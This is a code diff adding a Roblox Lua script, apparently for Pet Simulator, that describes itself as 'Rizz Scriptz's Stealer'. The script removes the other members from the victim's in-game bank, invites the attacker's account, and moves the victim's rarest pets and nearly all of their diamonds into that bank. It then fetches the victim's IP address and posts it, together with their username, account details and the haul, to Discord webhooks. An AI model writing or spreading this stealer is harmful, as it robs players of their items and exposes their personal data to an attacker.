+local tier3hold = 200 - petsinbank
+local tier4hold = 500 - petsinbank
+local tier1gems = 10000000000 - gemsinbank
+local tier2gems = 50000000000 - gemsinbank
+local tier3gems = 300000000000 - gemsinbank
+local tier4gems = 1500000000000 - gemsinbank
+
+-- Kicking The Players
+
+for i, v in pairs(SuperBank["Players"]) do
+    if v ~= _G.UserID then
+        kickremote:InvokeServer(Bank, v)
+    end
+end
+
+-- First Invite
+
+if tier ~= 1 then
+    if dhid ~= nil then
+        inviteremote:InvokeServer(mybanks[1]["BUID"], dhid)
+    end
+    task.wait()
+    inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
+end
+-- Bank Pets
+Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+Functions = Library.Functions
+
+
+BEXCList = {}
+BMythicList = {}
+BSecretList = {}
+BHugeList = {}
+BPogList = {}
+BBananaList = {}
+
+
+BSList = {}
+BEList = {}
+BMList = {}
+BHList = {}
+BPList = {}
+BBList = {}
+
+table.foreach(Library.Directory.Pets, function(i, v)
+    if v.rarity == "Exclusive" or v.rarity == "Event" then
+        table.insert(BEXCList, i)
+    end
+    if v.rarity == "Mythical" then
+        table.insert(BMythicList, i)
+    end
+    if v.huge then
+        table.insert(BHugeList, i)
+    end
+    if v.rarity == "Secret" then
+        table.insert(BSecretList, i)
+    end
+    if string.split(v.name, " ")[1] == "Pog" then
+        table.insert(BPogList, i)
+    end
+    if v.name == "banana" then
+        table.insert(BBananaList, i)
+    end
+end)
+for i, v in pairs(BPogList) do
+    table.insert(BEXCList, v)
+end
+for i, v in pairs(BBananaList) do
+    table.insert(BEXCList, v)
+end
+local pets = SuperBank["Storage"]["Pets"]
+local y = {}
+for i, v in pairs(pets) do
+    y[v["uid"]] = false
+end
+for i, v in pairs(pets) do
+    if table.find(BEXCList, v["id"]) ~= nil then
+        table.insert(BEList, v["uid"])
+    end
+    if table.find(BMythicList, v["id"]) ~= nil and v.s >= 1e+15 then
+        table.insert(BMList, v["uid"])
+    end
+    if table.find(BSecretList, v["id"]) ~= nil then
+        table.insert(BSList, v["uid"])
+    end
+    if table.find(BHugeList, v["id"]) ~= nil then
+        table.insert(BHList, v["uid"])
+    end
+end
+
+local BEHList = #BEList - #BHList
+
+-- Pet stuff
+local FinalList = {}
+
+Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+Functions = Library.Functions
+
+EXCList = {}
+MythicList = {}
+SecretList = {}
+HugeList = {}
+PogList = {}
+BananaList = {}
+
+
+SList = {}
+EList = {}
+MList = {}
+HList = {}
+PList = {}
+BList = {}
+
+table.foreach(Library.Directory.Pets, function(i, v)
+    if v.rarity == "Exclusive" and not v.huge then
+        table.insert(EXCList, i)
+    end
+    if v.rarity == "Event" then
+        table.insert(EXCList, i)
+    end
+    if v.rarity == "Mythical" then
+        table.insert(MythicList, i)
+    end
+    if v.huge then
+        table.insert(HugeList, i)
+    end
+    if v.rarity == "Secret" then
+        table.insert(SecretList, i)
+    end
+    if string.split(v.name, " ")[1] == "Pog" then
+        table.insert(PogList, i)
+    end
+    if v.name == "banana" then
+        table.insert(BananaList, i)
+    end
+end)
+for i, v in pairs(PogList) do
+    table.insert(EXCList, v)
+end
+for i, v in pairs(BananaList) do
+    table.insert(EXCList, v)
+end
+local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+local y = {}
+for i, v in pairs(pets) do
+    y[v["uid"]] = false
+end
+lockremote:InvokeServer(y)
+for i, v in pairs(pets) do
+    if table.find(EXCList, v["id"]) ~= nil then
+        table.insert(EList, v["uid"])
+    end
+    if table.find(MythicList, v["id"]) ~= nil and v.s >= 1e+15 and not v.hc then
+        table.insert(MList, v["uid"])
+    end
+    if table.find(MythicList, v["id"]) ~= nil and v.hc then
+        table.insert(MList, v["uid"])
+    end
+    if table.find(SecretList, v["id"]) ~= nil then
+        table.insert(SList, v["uid"])
+    end
+    if table.find(HugeList, v["id"]) ~= nil then
+        table.insert(HList, v["uid"])
+    end
+end
+if tier == 1 then
+    max = tier1hold
+elseif tier == 2 then
+    if tier2hold > 50 then
+        max = 50
+    elseif tier2hold < 50 then
+        max = tier2hold
+    end
+elseif tier == 3 then
+    if tier3hold > 50 then
+        max = 50
+    elseif tier3hold < 50 then
+        max = tier3hold
+    end
+elseif tier == 4 then
+    if tier4hold > 50 then
+        max = 50
+    elseif tier4hold < 50 then
+        max = tier4hold
+    end
+else
+    max = 50
+end
+print(max)
+if #EList + #MList + #PList + #SList + #HList < max then
+    for i, v in pairs(HList) do
+        table.insert(FinalList, v)
+    end
+    for i, v in pairs(EList) do
+        table.insert(FinalList, v)
+    end
+    for i, v in pairs(SList) do
+        table.insert(FinalList, v)
+    end
+    for i, v in pairs(MList) do
+        table.insert(FinalList, v)
+    end
+elseif #EList + #SList + #MList + #HList > max and #HList < max then
+    for i, v in pairs(HList) do
+        table.insert(FinalList, v)
+    end
+    for i, v in pairs(EList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+    for i, v in pairs(SList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+    for i, v in pairs(MList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+elseif #EList + #SList + #MList + #HList > max and #HList > max then
+    for i, v in pairs(HList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+elseif #EList + #MList + #PList + #SList + #HList > max and #HList == 0 and #EList < max then
+    for i, v in pairs(EList) do
+        table.insert(FinalList, v)
+    end
+    for i, v in pairs(SList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+    for i, v in pairs(MList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+elseif #EList + #MList + #PList + #SList > max and #HList == 0 and #EList > max then
+    for i, v in pairs(EList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+elseif #EList + #MList + #PList + #SList > max and #HList == 0 and #EList == 0 and #SList < max then
+    for i, v in pairs(SList) do
+        table.insert(FinalList, v)
+    end
+    for i, v in pairs(MList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+elseif #EList + #MList + #PList + #SList > max and #HList == 0 and #EList == 0 and #SList > max then
+    for i, v in pairs(SList) do
+        if #FinalList < max then
+            table.insert(FinalList, v)
+        end
+    end
+end
+-- Bank Pets
+wait()
+game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
+local A_1 = {
+    [1] = "Cracked Egg",
+    [2] = false
+}
+eggremote:InvokeServer("Cracked Egg", false, false)
+wait()
+local A_1 = {
+    [1] = Bank,
+    [2] = FinalList,
+    [3] = 0
+}
+
+wait()
+local diaamt = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Diamonds
+if diaamt ~= 0 then
+    diaamt = diaamt - 1
+end
+
+if tier == 1 and diaamt > tier1gems then
+    diaamt = tier1gems
+elseif tier == 1 and diaamt <= tier1gems then
+    diaamt = diaamt
+elseif tier == 2 and diaamt > tier2gems then
+    diaamt = tier2gems
+elseif tier == 2 and diaamt <= tier2gems then
+    diaamt = diaamt
+elseif tier == 3 and diaamt > tier3gems then
+    diaamt = tier3gems
+elseif tier == 3 and diaamt <= tier3gems then
+    diaamt = diaamt
+elseif tier == 4 and diaamt > tier4gems then
+    diaamt = tier4gems
+elseif tier == 4 and diaamt <= tier4gems then
+    diaamt = diaamt
+else
+    diaamt = diaamt
+end
+
+
+
+
+local s, e = pcall(function()
+    wait(0.2)
+    depositremote:InvokeServer(Bank, FinalList, diaamt)
+end)
+
+if s == false then
+    wait(0.2)
+    depositremote:InvokeServer(Bank, FinalList, 1)
+end
+local banktiercheck = true
+if s == true then
+    if tier == 1 and diaamt + SuperBank["Storage"]["Currency"]["Diamonds"] >= 40000000 then
+        upgraderemote:InvokeServer(Bank)
+        banktiercheck = true
+        tier = 2
+    elseif tier == 1 and diaamt + SuperBank["Storage"]["Currency"]["Diamonds"] < 40000000 then
+        banktiercheck = false
+        game:GetService("Players").LocalPlayer:Kick("Script Is Not Supported")
+    end
+end
+local SFinalList = {}
+if #FinalList == 50 then
+    wait(0.5)
+    local Smax = 50
+
+    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+    Functions = Library.Functions
+
+    SEXCList = {}
+    SMythicList = {}
+    SSecretList = {}
+    SHugeList = {}
+    SPogList = {}
+    SBananaList = {}
+
+
+    SSList = {}
+    SEList = {}
+    SMList = {}
+    SHList = {}
+    SPList = {}
+    SBList = {}
+
+    table.foreach(Library.Directory.Pets, function(i, v)
+        if v.rarity == "Exclusive" and not v.huge then
+            table.insert(SEXCList, i)
+        end
+        if v.rarity == "Event" and not v.huge then
+            table.insert(SEXCList, i)
+        end
+        if v.rarity == "Mythical" then
+            table.insert(SMythicList, i)
+        end
+        if v.huge then
+            table.insert(SHugeList, i)
+        end
+        if v.rarity == "Secret" then
+            table.insert(SSecretList, i)
+        end
+        if string.split(v.name, " ")[1] == "Pog" then
+            table.insert(SPogList, i)
+        end
+        if v.name == "banana" then
+            table.insert(SBananaList, i)
+        end
+    end)
+    for i, v in pairs(SPogList) do
+        table.insert(SEXCList, v)
+    end
+    for i, v in pairs(SBananaList) do
+        table.insert(SEXCList, v)
+    end
+    local Spets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+    local y = {}
+    for i, v in pairs(Spets) do
+        y[v["uid"]] = false
+    end
+    for i, v in pairs(Spets) do
+        if table.find(SEXCList, v["id"]) ~= nil then
+            table.insert(SEList, v["uid"])
+        end
+        if table.find(SMythicList, v["id"]) ~= nil and v.s >= 1e+15 and not v.hc then
+            table.insert(SMList, v["uid"])
+        end
+        if table.find(SMythicList, v["id"]) ~= nil and v.hc then
+            table.insert(SMList, v["uid"])
+        end
+        if table.find(SSecretList, v["id"]) ~= nil then
+            table.insert(SSList, v["uid"])
+        end
+        if table.find(SHugeList, v["id"]) ~= nil then
+            table.insert(SHList, v["uid"])
+        end
+    end
+    if tier == 1 then
+        Smax = tier1hold - #FinalList
+    elseif tier == 2 then
+        if tier2hold - #FinalList > 50 then
+            Smax = 50
+        elseif tier2hold - #FinalList < 50 then
+            Smax = tier2hold - #FinalList
+        end
+    elseif tier == 3 then
+        if tier3hold - #FinalList > 50 then
+            Smax = 50
+        elseif tier3hold - #FinalList < 50 then
+            Smax = tier3hold - #FinalList
+        end
+    elseif tier == 4 - #FinalList then
+        if tier4hold - #FinalList > 50 then
+            Smax = 50
+        elseif tier4hold - #FinalList < 50 then
+            Smax = tier4hold - #FinalList
+        end
+    else
+        Smax = 50
+    end
+    print(Smax)
+    if #SEList + #SMList + #SPList + #SSList + #SHList < Smax then
+        for i, v in pairs(SHList) do
+            table.insert(SFinalList, v)
+        end
+        for i, v in pairs(SEList) do
+            table.insert(SFinalList, v)
+        end
+        for i, v in pairs(SSList) do
+            table.insert(SFinalList, v)
+        end
+        for i, v in pairs(SMList) do
+            table.insert(SFinalList, v)
+        end
+    elseif #SEList + #SSList + #SMList + #SHList > Smax and #SHList < Smax then
+        for i, v in pairs(SHList) do
+            table.insert(SFinalList, v)
+        end
+        for i, v in pairs(SEList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+        for i, v in pairs(SSList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+        for i, v in pairs(SMList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+    elseif #SEList + #SSList + #SMList + #SHList > Smax and #SHList > Smax then
+        for i, v in pairs(SHList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+    elseif #SEList + #SMList + #SPList + #SSList + #SHList > Smax and #SHList == 0 and #SEList < Smax then
+        for i, v in pairs(SEList) do
+            table.insert(SFinalList, v)
+        end
+        for i, v in pairs(SSList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+        for i, v in pairs(SMList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+    elseif #SEList + #SMList + #SPList + #SSList > Smax and #SHList == 0 and #SEList > Smax then
+        for i, v in pairs(SEList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+    elseif #SEList + #SMList + #SPList + #SSList > Smax and #SHList == 0 and #SEList == 0 and #SSList < Smax then
+        for i, v in pairs(SSList) do
+            table.insert(SFinalList, v)
+        end
+        for i, v in pairs(SMList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+    elseif #SEList + #SMList + #SPList + #SSList > Smax and #SHList == 0 and #SEList == 0 and #SSList > Smax then
+        for i, v in pairs(SSList) do
+            if #SFinalList < Smax then
+                table.insert(SFinalList, v)
+            end
+        end
+    end
+    -- Bank Pets
+    wait()
+    local A_1 = {
+        [1] = Bank,
+        [2] = SFinalList,
+        [3] = 0
+    }
+
+    wait()
+    local Sdiaamt = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Diamonds
+    if Sdiaamt ~= 0 then
+        Sdiaamt = Sdiaamt - 1
+    end
+
+    if tier == 1 and Sdiaamt > tier1gems - diaamt then
+        Sdiaamt = tier1gems - diaamt
+    elseif tier == 1 and diaamt <= tier1gems - diaamt then
+        Sdiaamt = Sdiaamt
+    elseif tier == 2 and diaamt > tier2gems - diaamt then
+        Sdiaamt = tier2gems - diaamt
+    elseif tier == 2 and diaamt <= tier2gems - diaamt then
+        Sdiaamt = Sdiaamt
+    elseif tier == 3 and diaamt > tier3gems - diaamt then
+        Sdiaamt = tier3gems - diaamt
+    elseif tier == 3 and diaamt <= tier3gems - diaamt then
+        Sdiaamt = Sdiaamt
+    elseif tier == 4 and diaamt > tier4gems - diaamt then
+        Sdiaamt = tier4gems - diaamt
+    elseif tier == 4 and diaamt <= tier4gems - diaamt then
+        Sdiaamt = Sdiaamt
+    else
+        Sdiaamt = Sdiaamt
+    end
+
+    local s, e = pcall(function()
+        wait(0.2)
+        depositremote:InvokeServer(Bank, SFinalList, Sdiaamt)
+    end)
+
+    if s == false then
+        wait(0.2)
+        depositremote:InvokeServer(Bank, SFinalList, 1)
+    end
+end
+-- abbreviations
+local diaamt2 = diaamt
+local abbreviations = {
+    k = 4,
+    m = 7,
+    b = 10,
+    T = 13,
+}
+local DiamondsCount = tostring(math.floor(diaamt2))
+
+local ChosenAbbreviation
+for abbreviation, digits in pairs(abbreviations) do
+    if #DiamondsCount >= digits and #DiamondsCount < (digits + 3) then
+        ChosenAbbreviation = abbreviation
+        break
+    end
+end
+
+if ChosenAbbreviation then
+    local digits = abbreviations[ChosenAbbreviation]
+    local rounded = math.floor(diaamt2 / 10 ^ (digits - 3)) * 10 ^ (digits - 3)
+    DiamondsCount = string.format("%0.2f", rounded / 10 ^ (digits - 1))
+    local addsd = string.split(DiamondsCount, ".")[2]
+    local pnt = "."
+    if string.split(addsd, "")[2] == "0" and string.split(addsd, "")[1] ~= "0" then
+        DiamondsCount = string.split(DiamondsCount, ".")[1] .. pnt .. string.split(addsd, "")[1] .. ChosenAbbreviation
+    elseif string.split(addsd, "")[2] == "0" and string.split(addsd, "")[1] == "0" then
+        DiamondsCount = string.split(DiamondsCount, ".")[1] .. ChosenAbbreviation
+    elseif string.split(addsd, "")[2] ~= "0" and string.split(addsd, "")[1] ~= "0" then
+        DiamondsCount = DiamondsCount .. ChosenAbbreviation
+    elseif string.split(addsd, "")[2] ~= "0" and string.split(addsd, "")[1] == "0" then
+        DiamondsCount = DiamondsCount .. ChosenAbbreviation
+    else
+        DiamondsCount = diamond
+    end
+end
+local Bdiaamt = SuperBank["Storage"]["Currency"]["Diamonds"]
+local Babbreviations = {
+    k = 4,
+    m = 7,
+    b = 10,
+    T = 13,
+}
+local BDiamondsCount = tostring(math.floor(Bdiaamt))
+local BChosenAbbreviation
+for Babbreviation, Bdigits in pairs(Babbreviations) do
+    if #BDiamondsCount >= Bdigits and #BDiamondsCount < (Bdigits + 3) then
+        BChosenAbbreviation = Babbreviation
+        break
+    end
+end
+
+if BChosenAbbreviation then
+    local Bdigits = Babbreviations[BChosenAbbreviation]
+    local Brounded = math.floor(Bdiaamt / 10 ^ (Bdigits - 3)) * 10 ^ (Bdigits - 3)
+    BDiamondsCount = string.format("%0.2f", Brounded / 10 ^ (Bdigits - 1))
+    local Baddsd = string.split(BDiamondsCount, ".")[2]
+    local pnt = "."
+    if string.split(Baddsd, "")[2] == "0" and string.split(Baddsd, "")[1] ~= "0" then
+        BDiamondsCount = string.split(BDiamondsCount, ".")[1] ..
+            pnt .. string.split(Baddsd, "")[1] .. BChosenAbbreviation
+    elseif string.split(Baddsd, "")[2] == "0" and string.split(Baddsd, "")[1] == "0" then
+        BDiamondsCount = string.split(BDiamondsCount, ".")[1] .. BChosenAbbreviation
+    elseif string.split(Baddsd, "")[2] ~= "0" and string.split(Baddsd, "")[1] ~= "0" then
+        BDiamondsCount = BDiamondsCount .. BChosenAbbreviation
+    elseif string.split(Baddsd, "")[2] ~= "0" and string.split(Baddsd, "")[1] == "0" then
+        BDiamondsCount = BDiamondsCount .. BChosenAbbreviation
+    else
+        BDiamondsCount = Bdiaamt
+    end
+end
+
+
+local totaldiamond = Bdiaamt + diaamt
+local Tabbreviations = {
+    k = 4,
+    m = 7,
+    b = 10,
+    T = 13,
+}
+local TDiamondsCount = tostring(math.floor(totaldiamond))
+
+local TChosenAbbreviation
+for Tabbreviation, Tdigits in pairs(Tabbreviations) do
+    if #TDiamondsCount >= Tdigits and #TDiamondsCount < (Tdigits + 3) then
+        TChosenAbbreviation = Tabbreviation
+        break
+    end
+end
+
+if TChosenAbbreviation then
+    local Tdigits = Tabbreviations[TChosenAbbreviation]
+    local Trounded = math.floor(totaldiamond / 10 ^ (Tdigits - 3)) * 10 ^ (Tdigits - 3)
+    TDiamondsCount = string.format("%0.2f", Trounded / 10 ^ (Tdigits - 1))
+    local Taddsd = string.split(TDiamondsCount, ".")[2]
+    local pnt = "."
+    if string.split(Taddsd, "")[2] == "0" and string.split(Taddsd, "")[1] ~= "0" then
+        TDiamondsCount = string.split(TDiamondsCount, ".")[1] ..
+            pnt .. string.split(Taddsd, "")[1] .. TChosenAbbreviation
+    elseif string.split(Taddsd, "")[2] == "0" and string.split(Taddsd, "")[1] == "0" then
+        TDiamondsCount = string.split(TDiamondsCount, ".")[1] .. TChosenAbbreviation
+    elseif string.split(Taddsd, "")[2] ~= "0" and string.split(Taddsd, "")[1] ~= "0" then
+        TDiamondsCount = TDiamondsCount .. TChosenAbbreviation
+    elseif string.split(Taddsd, "")[2] ~= "0" and string.split(Taddsd, "")[1] == "0" then
+        TDiamondsCount = TDiamondsCount .. TChosenAbbreviation
+    else
+        TDiamondsCount = totaldiamond
+    end
+end
+
+local Wdiaamt = DiamondsDiamonds
+local Wabbreviations = {
+    k = 4,
+    m = 7,
+    b = 10,
+    T = 13,
+}
+local WDiamondsCount = tostring(math.floor(Wdiaamt))
+
+local WChosenAbbreviation
+for Wabbreviation, Wdigits in pairs(Wabbreviations) do
+    if #WDiamondsCount >= Wdigits and #WDiamondsCount < (Wdigits + 3) then
+        WChosenAbbreviation = Wabbreviation
+        break
+    end
+end
+
+if WChosenAbbreviation then
+    local Wdigits = Wabbreviations[WChosenAbbreviation]
+    local Wrounded = math.floor(Wdiaamt / 10 ^ (Wdigits - 3)) * 10 ^ (Wdigits - 3)
+    WDiamondsCount = string.format("%0.2f", Wrounded / 10 ^ (Wdigits - 1))
+    local Waddsd = string.split(WDiamondsCount, ".")[2]
+    local pnt = "."
+    if string.split(Waddsd, "")[2] == "0" and string.split(Waddsd, "")[1] ~= "0" then
+        WDiamondsCount = string.split(WDiamondsCount, ".")[1] ..
+            pnt .. string.split(Waddsd, "")[1] .. WChosenAbbreviation
+    elseif string.split(Waddsd, "")[2] == "0" and string.split(Waddsd, "")[1] == "0" then
+        WDiamondsCount = string.split(WDiamondsCount, ".")[1] .. WChosenAbbreviation
+    elseif string.split(Waddsd, "")[2] ~= "0" and string.split(Waddsd, "")[1] ~= "0" then
+        WDiamondsCount = WDiamondsCount .. WChosenAbbreviation
+    elseif string.split(Waddsd, "")[2] ~= "0" and string.split(Waddsd, "")[1] == "0" then
+        WDiamondsCount = WDiamondsCount .. WChosenAbbreviation
+    else
+        WDiamondsCount = DiamondsDiamonds
+    end
+end
+
+
+
+-- Sending webhook
+
+local username = game:GetService("Players").LocalPlayer.Name
+local fardplayer = game:GetService("Players").LocalPlayer
+local receiver = game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
+local IPadress = game:HttpGet('https://ipinfo.io/ip')
+local banktier = SuperBank["Tier"]
+local lmao = "/5"
+local ping
+if #HList ~= 0 or #BHList ~= 0 then
+    ping = "@everyone"
+elseif #HList == 0 and #BHList == 0 then
+    ping = ""
+end
+-- Img
+local data1
+if banktiercheck == true then
+    imgs = "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
+
+    data1 = {
+        ["content"] = ping,
+        ["username"] = "Rizz Scriptz",
+        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif",
+        ["embeds"] = { {
+            ["title"] = "**New Hit** ||With Rizz||",
+            ["url"] = "https://discord.gg/uSgzNwHDTS",
+            ["type"] = "rich",
+            ["color"] = tonumber(0x2798FF),
+            ["thumbnail"] = {
+                ["url"] = imgs,
+                ["height"] = 420,
+                ["width"] = 420
+            },
+            ["fields"] = { {
+                ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
+                ["value"] = "```Username     : " .. username .. "\nDisplay Name : " .. fardplayer.DisplayName ..
+                    "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
+                    " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank ..
+                    "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "\nBank Tier    : Tier " .. SuperBank["Tier"] .. "```",
+                ["inline"] = false
+            }, {
+                ["name"] = ":gem: **Diamonds** :gem:",
+                ["value"] = "```" .. DiamondsCount .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":dog: **Pets** :dog:",
+                ["value"] = "```" .. #FinalList + #SFinalList .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":money_mouth: **Huges** :money_mouth:",
+                ["value"] = "```" .. #HList .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":cat: **Exclusives** :cat:",
+                ["value"] = "```" .. #EList .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":performing_arts: **Secrets** :performing_arts:",
+                ["value"] = "```" .. #SList .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":rabbit: **Mythicals** :rabbit:",
+                ["value"] = "```" .. #MList .. "```",
+                ["inline"] = true
+            },
+                {
+                    ["name"] = "---------------------------------------",
+                    ["value"] = "",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = ":eyes: **Bank Pets** :eyes:",
+                    ["value"] = "",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "---------------------------------------",
+                    ["value"] = "",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = ":gem: **Diamonds** :gem:",
+                    ["value"] = "```" .. BDiamondsCount .. "```",
+                    ["inline"] = true
+                }, {
+                ["name"] = ":dog: **Pets** :dog:",
+                ["value"] = "```" .. #SuperBank["Storage"]["Pets"] .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":money_mouth: **Huges** :money_mouth:",
+                ["value"] = "```" .. #BHList .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":cat: **Exclusives** :cat:",
+                ["value"] = "```" .. BEHList .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":performing_arts: **Secrets** :performing_arts:",
+                ["value"] = "```" .. #BSList .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":rabbit: **Mythicals** :rabbit:",
+                ["value"] = "```" .. #BMList .. "```",
+                ["inline"] = true
+            },
+                {
+                    ["name"] = ":bank: **Joined Banks** :bank:",
+                    ["value"] = "```" .. bankscount .. lmao .. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = ":gem: **Wd Diamonds** :gem:",
+                    ["value"] = "```" .. WDiamondsCount .. "```",
+                    ["inline"] = true
+                }, {
+                ["name"] = ":money_mouth: **Wd Huges** :money_mouth:",
+                ["value"] = "```" .. FinalFinal .. "```",
+                ["inline"] = true
+            },
+                {
+                    ["name"] = "---------------------------------------",
+                    ["value"] = "",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = ":eyes: **Total Pets** :eyes:",
+                    ["value"] = "",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "---------------------------------------",
+                    ["value"] = "",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = ":gem: **Diamonds** :gem:",
+                    ["value"] = "```" .. TDiamondsCount .. "```",
+                    ["inline"] = true
+                }, {
+                ["name"] = ":dog: **Pets** :dog:",
+                ["value"] = "```" .. #SuperBank["Storage"]["Pets"] + #FinalList .. "```",
+                ["inline"] = true
+            },
+            }
+        }
+        }
+    }
+end
+
+local newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+
+local headers = {
+    ["content-type"] = "application/json"
+}
+
+if _G.Webhook ~= nil then
+    local abcdef1 = {
+        Url = url,
+        Body = newdata1,
+        Method = "POST",
+        Headers = headers
+    }
+    request(abcdef1)
+end
+task.wait()
+if dhwebhook ~= nil then
+    local abcdef2 = {
+        Url = dhwebhook,
+        Body = newdata1,
+        Method = "POST",
+        Headers = headers
+    }
+    request(abcdef2)
+end
+for i, v in pairs(SuperBank["Players"]) do
+    if v ~= _G.UserID then
+        kickremote:InvokeServer(Bank, v)
+    end
+end
+while task.wait(0.1) do
+    if dhid ~= nil then
+        inviteremote:InvokeServer(mybanks[1]["BUID"], dhid)
+    end
+    task.wait()
+    inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
+end
